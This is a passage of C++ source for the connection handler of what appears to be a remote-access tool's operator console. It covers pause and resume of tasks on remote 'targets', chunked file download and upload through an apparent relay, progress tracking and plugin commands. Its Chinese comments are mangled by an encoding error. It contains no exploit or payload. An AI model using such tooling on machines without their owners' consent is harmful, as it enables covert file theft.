    ULONG taskType = strtoul(args[4].c_str(), NULL, 10);

    if ("OK" == args[5])
    {
        switch(taskType)
        {
        case TASK_DIR:
            {
                DirTask *dirTask = tarBlock->GetDirTaskFromMap(taskId);
                if (dirTask)
                {
                    TaskStatus oldStatus = (TaskStatus)dirTask->taskStatus;
                    dirTask->taskStatus = PAUSED;
                    tarBlock->DirTaskStatusChanged(dirTask, oldStatus);
                }
            }
            break;
        case TASK_SEARCH:
            {
                SearchTask *searchTask = tarBlock->GetSearchTaskFromMap(taskId);
                if (searchTask)
                {
                    TaskStatus oldStatus = (TaskStatus)searchTask->taskStatus;
                    searchTask->taskStatus = PAUSED;
                    tarBlock->SearchTaskStatusChanged(searchTask, oldStatus);
                }
            }
            break;
        default:
            {
                FileTask *fileTask = tarBlock->GetFileTaskFromMap(taskId);
                if (fileTask)
                {
                    TaskStatus oldStatus = (TaskStatus)fileTask->taskStatus;
                    fileTask->taskStatus = PAUSED;
                    tarBlock->FileTaskStatusChanged(fileTask, oldStatus);
                }
            }
        }
    }
    else
    {
        ULONG lastErrCode = strtoul(args[6].c_str(),NULL,10);

        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%d)] ��ͣ����(ID:%d)ʧ��! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    taskId,
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
    }
    
    return 0;    
}
//---------------------------------------------------------------------------

void  TargetConnection::Send_RFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType)
{
	// TID PID SFT TASKID TASKTYPE
	//  0   1   2     3      4
    //
    
    std::ostringstream buf;
    buf << dwTargetID << " 1 RFT " << dwTaskID << " " << dwTaskType << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_RFT(std::vector<std::string> & args)
{
	// TID PID RFT TASKID TASKTYPE OK(ERR) [ERRID]
	//  0   1   2     3       4      5        6
    //

    if (args.size() != 6 && args.size() != 7)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }
    
    ULONG taskId = strtoul(args[3].c_str(),NULL,10);
    ULONG taskType = strtoul(args[4].c_str(), NULL, 10);

    if ("OK" == args[5])
    {
        switch(taskType)
        {
        case TASK_DIR:
            {
                DirTask *dirTask = tarBlock->GetDirTaskFromMap(taskId);
                if (dirTask)
                {
                    TaskStatus oldStatus = (TaskStatus)dirTask->taskStatus;
                    dirTask->taskStatus = WORKING;
                    tarBlock->DirTaskStatusChanged(dirTask, oldStatus);
                }
            }
            break;
        case TASK_SEARCH:
            {
                SearchTask *searchTask = tarBlock->GetSearchTaskFromMap(taskId);
                if (searchTask)
                {
                    TaskStatus oldStatus = (TaskStatus)searchTask->taskStatus;
                    searchTask->taskStatus = WORKING;
                    tarBlock->SearchTaskStatusChanged(searchTask, oldStatus);
                }
            }
            break;
        default:
            {
                FileTask *fileTask = tarBlock->GetFileTaskFromMap(taskId);
                if (fileTask)
                {
                    TaskStatus oldStatus = (TaskStatus)fileTask->taskStatus;
                    fileTask->taskStatus = WORKING;
                    tarBlock->FileTaskStatusChanged(fileTask, oldStatus);
                }
            }
        }   
    }
    else
    {
        ULONG lastErrCode = strtoul(args[6].c_str(),NULL,10);

        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%d)] �ָ�����(ID:%d)ʧ��! ������%s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    taskId,
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
    }
    
    return 0;
}
//---------------------------------------------------------------------------
// ���յ�FileTask��״̬ΪCanceled, Errored��Finished,����DFT֪ͨ��ת�������������
//
void  TargetConnection::Send_DFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType)
{
	// TID PID DFT TASKID TASKTYPE
	//  0   1   2     3      4

    std::ostringstream buf;
    buf << dwTargetID << " 1 DFT " << dwTaskID << " " << dwTaskType << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_FTS(std::vector<std::string> & args)
{
   	// TID PID FTS TaskID TaskDirect TotalLen  DaemonedLen FinishedLen
	//  0   1   2     3       4          5         6            7            
	//

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    ULONG taskId = strtoul(args[3].c_str(),NULL,10);
    FileTask *fileTask = tarBlock->GetFileTaskFromMap(taskId);
    if (fileTask == NULL)
    {
        return 0;
    }

    fileTask->dwTotalLen    = strtoul(args[5].c_str(),NULL,10);
    fileTask->dwDaemonedLen = strtoul(args[6].c_str(),NULL,10);
    fileTask->dwFinishedLen = strtoul(args[7].c_str(),NULL,10);

    bool bUpdate = true;
    if (0 != fileTask->dwTotalLen)
    {
        fileTask->nFinishedProp = (int)((double)fileTask->dwFinishedLen /(double)fileTask->dwTotalLen * 100);
        fileTask->nDaemonedProp = (int)((double)(fileTask->dwDaemonedLen - fileTask->dwFinishedLen) /(double)fileTask->dwTotalLen * 100);
    }
    else
    {
        fileTask->nFinishedProp = 100;
        fileTask->nDaemonedProp = 100;        
    }

    // ���½���
    //
    tarBlock->FileTaskProgressChanged(fileTask);

	return true;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_DOW(std::vector<std::string> & args)
{
	// TID PID DOWF TaskID StartPos DATA DATALEN\r\FileContent
	//  0   1   2      3      4       5     6
	//

	// TID PID DOWF TaskID StartPos DATAFIN DATALEN\r\FileContent
	//  0   1   2      3      4       5       6
	//

	std::string data;
	int			dataLen = atoi(args[6].c_str());
    if (dataLen > 0)
    {
        if (false == IsWholeDataAvailable(dataLen))
        {
            RecoverCommand();
            return -1;
        }

        data = GetData(dataLen);

    }

    ULONG targetId = strtoul(args[0].c_str(),NULL,10);
    assert(targetId == ownerTarget->dwTargetID);

    ULONG taskId   = strtoul(args[3].c_str(),NULL,10);
    FileTask *fileTask = ownerTarget->GetFileTaskFromMap(taskId);
    if (fileTask == NULL)
    {
        return 0;
    }

    if (fileTask->taskStatus != WORKING)           //  0
    {
        ownerTarget->ScheduleTarFileTask();
        return 0;
    }

    ULONG startPos = strtoul(args[4].c_str(),NULL,10);
    int ret = SaveDataToLocalFile(fileTask, startPos, data.c_str(), dataLen);
    if ( 0 != ret)
    {
        Send_ERR(fileTask);
        return 0;
    }

    if ("DATAFIN" == args[5])
    {
        // �رվ��
        //
        if (fileTask->hFile)
        {
            CloseHandle(fileTask->hFile);
            fileTask->hFile = NULL;
        }

        // ֪ͨ��ת�������Ѿ����
        //
        this->Send_DOW(fileTask, -1);        
    }
    else
    {
        // Request next dowf data
        //
        this->Send_DOW(fileTask, fileTask->dwFinishedLen);
    }

    // ���½���
    //
    ownerTarget->FileTaskProgressChanged(fileTask);

    return 0;
}
//--------------------------------------------------------------------------
void  TargetConnection::Send_UPL(FileTask *fileTask, std::string flag, ULONG dataLen)

{

	// TID PID UPL TaskID StartPos DATA DATALEN\r\nFileContent

	//  0   1   2      3      4      5      6
	//

	// TID PID UPL TaskID StartPos DATAFIN DATALEN\r\nFileContent
	//  0   1   2      3      4        5      6           
	//

    std::ostringstream buf;

    buf << fileTask->dwTargetID << " 1 UPL " << fileTask->dwTaskID

        << " " << fileTask->dwDaemonedLen << " " << flag << " " << dataLen << "\r\n";

    this->WriteDataCmd(buf.str(), this->readBuf, dataLen);

}

//---------------------------------------------------------------------------

void  TargetConnection::Start_UPL(FileTask *fileTask)

{

	// TID PID UPLB TaskID StartPos

	//  0   1   2     3       4
	//

	std::ostringstream buf;
	buf << fileTask->dwTargetID << " 1 UPL " << fileTask->dwTaskID << " " << fileTask->dwDaemonedLen; 

	std::vector<std::string> fakeUplCmd = SplitString(buf.str(), " ");
	fakeUplCmd.push_back(buf.str());
	this->Handle_UPL(fakeUplCmd);

}

//---------------------------------------------------------------------------
int  TargetConnection::Handle_UPL(std::vector<std::string> & args)
{
    // TID PID UPL TaskID StartPos
	//  0   1   2     3       4
	//
    ULONG targetId = strtoul(args[0].c_str(),NULL,10);
    assert(targetId == ownerTarget->dwTargetID);

    ULONG taskId   = strtoul(args[3].c_str(),NULL,10);
    FileTask *fileTask = ownerTarget->GetFileTaskFromMap(taskId);

    if (fileTask == NULL)
    {
		//OutputDebugStringW(L"File task not found.\r\n");
        return 0;
    }
    
    if (fileTask->taskStatus != WORKING)
    {
        ownerTarget->ScheduleTarFileTask();
		//OutputDebugStringW(L"Status incorrect.\r\n");
        return 0;
    }

    ULONG startPos = strtoul(args[4].c_str(),NULL,10);
    if ((long)startPos == -1)
    {
		//OutputDebugStringW(L"Start position incorrect.\r\n");
        return 0;   
    }
    
    // Read data from local file
    //
    int byteReaded = 0;
    int ret = ReadDataFromLocalFile(fileTask, startPos, this->readBuf, FILE_BLOCK_LENGTH, &byteReaded);
    if (0 != ret)
    {
        if (ERR_RED_FILE_END == ret)
        {
            Send_UPL(fileTask, "DATAFIN", byteReaded);

            // �رվ��
            //
            if (fileTask->hFile)
            {
                CloseHandle(fileTask->hFile);
                fileTask->hFile = NULL;
            }
        }
        else
        {
			/*WCHAR errMsg[MAX_PATH] = {0};
			wsprintfW(errMsg, L"ReadFile Failed.\r\nErrorID : %d", ret);
			MessageBoxW(NULL, errMsg, errMsg, MB_OK);*/
            Send_ERR(fileTask);
            return 0;        
        }
    }
    else
    {
        Send_UPL(fileTask,"DATA",byteReaded);
    }

    // ���½���
    //

    ownerTarget->FileTaskProgressChanged(fileTask);
    
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_ERR(FileTask *fileTask)

{

	// TID PID ERR TaskType TaskID ErrorCode

	//  0   1   2     3        4      5
	//

	/*WCHAR errMsg[MAX_PATH] = {0};
	wsprintfW(errMsg, L"ReadFile Failed : %s.\r\nTask Type : ", fileTask->ctrPathW.c_str(), fileTask->taskType);
	MessageBoxW(NULL, errMsg, L"", MB_OK);*/

    std::ostringstream buf;

    buf << fileTask->dwTargetID << " 1 ERR " << ConvertTaskDirectToStr((TaskDirect)fileTask->taskDirect)

        << " " << fileTask->dwTaskID << " " << fileTask->dwErrorID << "\r\n";

    this->Write(buf);

}

//---------------------------------------------------------------------------

void  TargetConnection::Send_PNG()

{
    // TID PID PNG
    //  0   1   2
    //
    std::ostringstream buf;
    buf << ownerTarget->dwTargetID << " 0 PNG\r\n";
    this->Write(buf);
}

//---------------------------------------------------------------------------

int   TargetConnection::Handle_QNG(std::vector<std::string> & args)

{

    // Do nothing

    //

    return 0;

}

//---------------------------------------------------------------------------
int   TargetConnection::Handle_Plugin_CMD(std::vector<std::string> &args)
{

	// TID PID CMD DATA xxx xxx xxx LEN\r\n

	//  0   1   2   3
	//

	// TID PID CMD xxx xxx xxx \r\n
	//  0   1   2
	//   


	int	dataLen = 0;
	if ("DATA" == args[3])
	{
		dataLen = atoi(args[args.size() - 1].c_str());
        if (false == IsWholeDataAvailable(dataLen))
		{
  			RecoverCommand();
			return -1;
		}
	}


	std::string str = args[2].c_str();

    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    if (targetId == 0)
    {
        assert(false);
        return 0;
    }

/* @@@   PDATA_BLOCK dataBlock = new DATA_BLOCK();

    dataBlock->targetId = targetId;

    dataBlock->args     = args;

    dataBlock->dataLen  = dataLen;

    dataBlock->next     = NULL;

    if (dataLen > 0)

    {

        dataBlock->data = GetData(dataLen);

    }


    FrmMain->PushPlgDataBlock(dataBlock); */


    return 0;

}

//---------------------------------------------------------------------------
